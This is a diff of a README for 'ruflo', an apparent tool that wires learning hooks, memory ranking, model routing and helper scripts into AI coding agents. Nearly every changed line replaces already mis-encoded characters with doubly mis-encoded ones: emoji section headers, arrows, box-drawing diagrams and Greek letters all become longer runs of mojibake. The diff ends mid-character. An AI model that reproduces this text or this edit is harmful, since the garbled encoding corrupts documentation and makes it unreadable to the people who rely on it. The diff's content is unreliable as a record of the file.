ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
      HNSW              Verdict            LoRA              EWC++
    150x faster        success/fail      compression       memory lock
 ```
@@ -3326,32 +3326,32 @@ The intelligence loop wires PageRank-ranked memory into the hook system. Every s
 
 ```
 SessionStart:
-  session-restore  Ã¢â€ â€™ intelligence.init()
-    Ã¢â€ â€™ Read MEMORY.md / auto-memory-store.json
-    Ã¢â€ â€™ Build graph (nodes + similarity/temporal edges)
-    Ã¢â€ â€™ Compute PageRank
-    Ã¢â€ â€™ "[INTELLIGENCE] Loaded 13 patterns, 12 edges"
+  session-restore  ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ intelligence.init()
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Read MEMORY.md / auto-memory-store.json
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Build graph (nodes + similarity/temporal edges)
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Compute PageRank
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ "[INTELLIGENCE] Loaded 13 patterns, 12 edges"
 
 UserPrompt:
-  route            Ã¢â€ â€™ intelligence.getContext(prompt)
-    Ã¢â€ â€™ Jaccard-match prompt against pre-ranked entries
-    Ã¢â€ â€™ Inject top-5 patterns into Claude's context:
+  route            ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ intelligence.getContext(prompt)
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Jaccard-match prompt against pre-ranked entries
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Inject top-5 patterns into Claude's context:
 
     [INTELLIGENCE] Relevant patterns for this task:
       * (0.95) HNSW gives HNSW-indexed search [rank #1, 12x accessed]
       * (0.88) London School TDD preferred [rank #3, 8x accessed]
 
 PostEdit:
-  post-edit        Ã¢â€ â€™ intelligence.recordEdit(file)
-    Ã¢â€ â€™ Append to pending-insights.jsonl (<2ms)
+  post-edit        ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ intelligence.recordEdit(file)
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Append to pending-insights.jsonl (<2ms)
 
 SessionEnd:
-  session-end      Ã¢â€ â€™ intelligence.consolidate()
-    Ã¢â€ â€™ Process pending insights (3+ edits Ã¢â€ â€™ new entry)
-    Ã¢â€ â€™ Confidence boost for accessed patterns (+0.03)
-    Ã¢â€ â€™ Confidence decay for unused patterns (-0.005/day)
-    Ã¢â€ â€™ Recompute PageRank, rebuild edges
-    Ã¢â€ â€™ Save snapshot for trend tracking
+  session-end      ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ intelligence.consolidate()
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Process pending insights (3+ edits ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ new entry)
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Confidence boost for accessed patterns (+0.03)
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Confidence decay for unused patterns (-0.005/day)
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Recompute PageRank, rebuild edges
+    ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Save snapshot for trend tracking
 ```
 
 **Measuring improvement:**
@@ -3417,7 +3417,7 @@ The stats command shows:
 
 ### All 27 Hooks by Category
 
-#### Ã°Å¸â€Â§ Tool Lifecycle Hooks (6 hooks)
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ Tool Lifecycle Hooks (6 hooks)
 
 | Hook | When It Fires | What It Does | Learning Benefit |
 |------|---------------|--------------|------------------|
@@ -3425,7 +3425,7 @@ The stats command shows:
 | `post-edit` | After file edit | Records outcome, extracts patterns | Learns successful edit strategies |
 | `pre-command` | Before shell command | Assesses risk, validates input | Learns which commands are safe |
 | `post-command` | After shell command | Tracks success/failure | Learns command reliability patterns |
-| `pre-task` | Before task starts | Routes to optimal agent | Learns taskÃ¢â€ â€™agent mappings |
+| `pre-task` | Before task starts | Routes to optimal agent | Learns taskÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢agent mappings |
 | `post-task` | After task completes | Records quality score | Learns what makes tasks succeed |
 
 ```bash
@@ -3434,7 +3434,7 @@ npx ruflo@latest hooks pre-edit ./src/auth.ts
 npx ruflo@latest hooks post-edit ./src/auth.ts --success true --train-patterns
 ```
 
-#### Ã°Å¸Â§Â  Intelligence & Routing Hooks (8 hooks)
+#### ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Intelligence & Routing Hooks (8 hooks)
 
 | Hook | Purpose | What You Get |
 |------|---------|--------------|
@@ -3455,7 +3455,7 @@ npx ruflo@latest hooks route "refactor authentication to use JWT" --include-expl
 npx ruflo@latest hooks pretrain --depth deep --model-type moe
 ```
 
-#### Ã°Å¸â€œâ€¦ Session Management Hooks (4 hooks)
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Â¦ Session Management Hooks (4 hooks)
 
 | Hook | Purpose | Key Options |
 |------|---------|-------------|
@@ -3472,7 +3472,7 @@ npx ruflo@latest hooks session-start --session-id "feature-auth" --start-daemon
 npx ruflo@latest hooks session-end --export-metrics --persist-patterns
 ```
 
-#### Ã°Å¸Â¤â€“ Intelligence System Hooks (9 hooks)
+#### ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ Intelligence System Hooks (9 hooks)
 
 | Hook | Category | What It Does |
 |------|----------|--------------|
@@ -3544,10 +3544,10 @@ Automatically selects haiku/sonnet/opus based on task complexity.
 ```bash
 # Get model recommendation
 npx ruflo@latest hooks model-route --task "fix typo in README"
-# Ã¢â€ â€™ Recommends: haiku (simple task, low complexity)
+# ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Recommends: haiku (simple task, low complexity)
 
 npx ruflo@latest hooks model-route --task "design distributed consensus system"
-# Ã¢â€ â€™ Recommends: opus (complex architecture, high reasoning)
+# ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Recommends: opus (complex architecture, high reasoning)
 ```
 
 ### Progress Tracking
@@ -3562,9 +3562,9 @@ npx ruflo@latest hooks model-route --task "design distributed consensus system"
 ### Quick Reference
 
 ```bash
-# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
 # MOST COMMON HOOKS
-# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
 
 # Route task to best agent (with intelligence context injection)
 npx ruflo@latest hooks route "<task>" --include-explanation
@@ -3577,7 +3577,7 @@ npx ruflo@latest hooks session-end --persist-patterns
 npx ruflo@latest hooks metrics
 npx ruflo@latest hooks intelligence stats
 
-# Intelligence diagnostics Ã¢â‚¬â€ see if intelligence is improving
+# Intelligence diagnostics ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â see if intelligence is improving
 node .cursor/hooks/hook-handler.cjs stats          # Human-readable
 node .cursor/hooks/hook-handler.cjs stats --json   # JSON for scripting
 node .cursor/hooks/intelligence.cjs stats           # Direct access
@@ -3594,7 +3594,7 @@ npx ruflo@latest hooks worker dispatch --trigger audit
 ---
 
 <details>
-<summary>Ã°Å¸â€œÂ¦ <strong>Pattern Store & Export</strong> Ã¢â‚¬â€ Share Patterns, Import Config</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ <strong>Pattern Store & Export</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Share Patterns, Import Config</summary>
 
 Share learned patterns across projects, teams, and the community via the decentralized pattern marketplace.
 
@@ -3841,12 +3841,12 @@ Real WASM-accelerated neural training using `@ruvector/learning-wasm` and `@ruve
 
 | Component | Performance | Description |
 |-----------|-------------|-------------|
-| **MicroLoRA** | **<3ÃŽÂ¼s adaptation** | Rank-2 LoRA with 105x faster than 100ÃŽÂ¼s target |
+| **MicroLoRA** | **<3ÃƒÅ½Ã‚Â¼s adaptation** | Rank-2 LoRA with 105x faster than 100ÃƒÅ½Ã‚Â¼s target |
 | **ScopedLoRA** | 17 operators | Per-task-type learning (coordination, security, testing) |
 | **FlashAttention** | 9,127 ops/sec | Memory-efficient attention mechanism |
 | **TrajectoryBuffer** | 10k capacity | Success/failure learning from patterns |
 | **InfoNCE Loss** | Contrastive | Temperature-scaled contrastive learning |
-| **AdamW Optimizer** | ÃŽÂ²1=0.9, ÃŽÂ²2=0.999 | Weight decay training optimization |
+| **AdamW Optimizer** | ÃƒÅ½Ã‚Â²1=0.9, ÃƒÅ½Ã‚Â²2=0.999 | Weight decay training optimization |
 
 ```bash
 # List available pre-trained models from IPFS registry
@@ -3882,7 +3882,7 @@ npx ruflo@latest neural export --ipfs --sign
 | MultiHead (4 heads) | 0.1661        | 6,020       |
 | MicroLoRA           | 0.0026        | 383,901     |
 +---------------------+---------------+-------------+
-MicroLoRA Target (<100ÃŽÂ¼s): Ã¢Å“â€œ PASS (2.60ÃŽÂ¼s actual)
+MicroLoRA Target (<100ÃƒÅ½Ã‚Â¼s): ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“ PASS (2.60ÃƒÅ½Ã‚Â¼s actual)
 ```
 
 #### Training Options
@@ -3903,12 +3903,12 @@ MicroLoRA Target (<100ÃŽÂ¼s): Ã¢Å“â€œ PASS (2.60ÃŽÂ¼s actual)
 
 ---
 
-## Ã°Å¸â€ºÂ Ã¯Â¸Â Development Tools
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â Development Tools
 
 Scripts, coordination systems, and collaborative development features.
 
 <details>
-<summary>Ã°Å¸â€ºÂ Ã¯Â¸Â <strong>Helper Scripts</strong> Ã¢â‚¬â€ 30+ Development Automation Tools</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Helper Scripts</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 30+ Development Automation Tools</summary>
 
 The `.cursor/hooks/` directory contains **30+ automation scripts** for development, monitoring, learning, and swarm coordination. These scripts integrate with hooks and can be called directly or via the V3 master tool.
 
@@ -3927,7 +3927,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 
 ### Helper Categories
 
-#### Ã°Å¸â€œÅ  Progress & Metrics
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  Progress & Metrics
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -3937,7 +3937,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 | `sync-v3-metrics.sh` | Sync metrics across systems | `.cursor/hooks/sync-v3-metrics.sh` |
 | `validate-v3-config.sh` | Validate configuration | `.cursor/hooks/validate-v3-config.sh` |
 
-#### Ã°Å¸Â¤â€“ Daemon & Worker Management
+#### ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ Daemon & Worker Management
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -3947,7 +3947,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 | `health-monitor.sh` | System health checks | `.cursor/hooks/health-monitor.sh` |
 | `perf-worker.sh` | Performance monitoring worker | `.cursor/hooks/perf-worker.sh` |
 
-#### Ã°Å¸Â§Â  Learning & Intelligence
+#### ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Learning & Intelligence
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -3957,7 +3957,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 | `pattern-consolidator.sh` | Consolidate patterns (EWC++) | `.cursor/hooks/pattern-consolidator.sh` |
 | `metrics-db.mjs` | Metrics database service | `node .cursor/hooks/metrics-db.mjs` |
 
-#### Ã°Å¸ÂÂ Swarm Coordination
+#### ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â Swarm Coordination
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -3965,7 +3965,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 | `swarm-comms.sh` | Inter-agent communication | `.cursor/hooks/swarm-comms.sh broadcast "msg"` |
 | `swarm-monitor.sh` | Real-time swarm monitoring | `.cursor/hooks/swarm-monitor.sh --watch` |
 
-#### Ã°Å¸â€â€™ Security & Compliance
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ Security & Compliance
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -3973,7 +3973,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 | `adr-compliance.sh` | Check ADR compliance | `.cursor/hooks/adr-compliance.sh` |
 | `ddd-tracker.sh` | Track DDD domain progress | `.cursor/hooks/ddd-tracker.sh` |
 
-#### Ã°Å¸â€™Â¾ Checkpoints & Git
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ Checkpoints & Git
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -3983,7 +3983,7 @@ The `.cursor/hooks/` directory contains **30+ automation scripts** for developme
 | `github-safe.js` | Safe GitHub operations | `node .cursor/hooks/github-safe.js` |
 | `github-setup.sh` | Configure GitHub integration | `.cursor/hooks/github-setup.sh` |
 
-#### Ã°Å¸Å½Â¯ Guidance & Hooks
+#### ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ Guidance & Hooks
 
 | Script | Purpose | Usage |
 |--------|---------|-------|
@@ -4047,31 +4047,31 @@ Helpers are configured in `.cursor/hooks.json`:
 ---
 
 <details>
-<summary>Ã°Å¸Å½â€œ <strong>Skills System</strong> Ã¢â‚¬â€ 42 Pre-Built Workflows for Any Task</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â½Ã¢â‚¬Å“ <strong>Skills System</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 42 Pre-Built Workflows for Any Task</summary>
 
 Skills are **reusable workflows** that combine agents, hooks, and patterns into ready-to-use solutions. Think of them as "recipes" for common development tasks.
 
 ### How Skills Work
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                         SKILL EXECUTION                          Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â